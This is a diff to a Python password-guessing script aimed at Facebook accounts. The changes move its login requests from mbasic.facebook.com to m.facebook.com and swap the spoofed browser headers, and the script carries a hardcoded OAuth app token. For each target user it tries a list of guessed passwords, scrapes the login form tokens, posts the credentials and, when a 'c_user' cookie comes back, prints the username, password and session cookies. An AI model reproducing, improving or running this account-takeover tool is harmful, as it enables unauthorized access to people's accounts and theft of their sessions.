@@ -1,4 +1,3 @@
-
 #!/usr/bin/python3
 import os
 try:
@@ -60,7 +59,7 @@ id = []
 user = []
 loop = 0
 url_lookup = "https://lookup-id.com/"
-url_mb = "https://mbasic.facebook.com"
+url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
 header_grup = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36 OPR/63.3.3216.58675i]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
@@ -134,23 +133,20 @@ class __xxx__:
             for pw in __chi__:
                 pw = pw.lower()
                 session=requests.Session()
-                header = {'authority': 'mbasic.facebook.com',
-    'method': 'GET',           
+                header = {'authority': 'm.facebook.com',
+    'method': 'GET',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    
-    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AffeznlJOB7i06Pv6cR8yJKFr-DWJvmpHGa0lyykncEPdkP3-gKxcnVeBbb91fcTOIpfgCmsAvEOe2EIR63m6EkctGpeCpHoEP0seBXdB9YhEg&smuh=19221&lh=Ac9p2U9CS_u-WFv4nVY&_rdr',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="110", "Google Chrome";v="110"',
+    'sec-ch-ua': '^\^Not_A',
     'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform': '^\^Windows^^',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/110.0.5411.97 Chrome/110.0.5411.97 Safari/537.36',}
-                r = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',  headers=header)
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',}
+                r = session.get('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',  headers=header)
                 das = {
                     "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                     "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
@@ -159,16 +155,25 @@ class __xxx__:
                     "pass":pw,
                     "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                 }
-                header1 = {
-                        'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.8',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5403.130 Safari/537.36',
-    'Content-Type': 'application/x-www-form-urlencoded', 
-    'Accept': '*/*',
-    'Referer': 'http://fiddle.jshell.net/_display/',
-    'X-Requested-With': 'XMLHttpRequest',
-    'Connection': 'keep-alive',}
-                po = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', data = das, headers = header1, allow_redirects = False)
+                header1 = {'authority': 'm.facebook.com',
+    'method': 'POST',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvO5XxBAmd3ArMAu7',
+    'origin': 'https://m.facebook.com',
+    'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+    'sec-ch-ua': '^\^Not_A',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '^\^Windows^^',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
+    'x-fb-lsd': 'AVpQaGyebwA',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-response-format': 'JSONStream',
+    'x_fb_background_state': '1',}
+                po = session.post('https://m.facebook.com/a/bz?fb_dtsg=NAcOPRDFINoQYB6CQuDBBo5p7jOKX_2Md-ERAEMUNo-NlKJqecq9MfA^%^3A0^%^3A0&jazoest=24639&lsd=AVpQaGyebwA&__dyn=0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw&__csr=&__req=1&__a=AYnXuvNIAiGhU87lQWLjaU8mXht1ObngyeqJChBWmfi_1qxu8Zh3LJ0lvIcE5uJcmNqvkX5mrZVSHwUSlWuHpEFlnPqD9NAcIXfd3q3hghq4UA&__user=0', data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     print(f"\r{H} [Jadu-ok] {user} | {pw}")
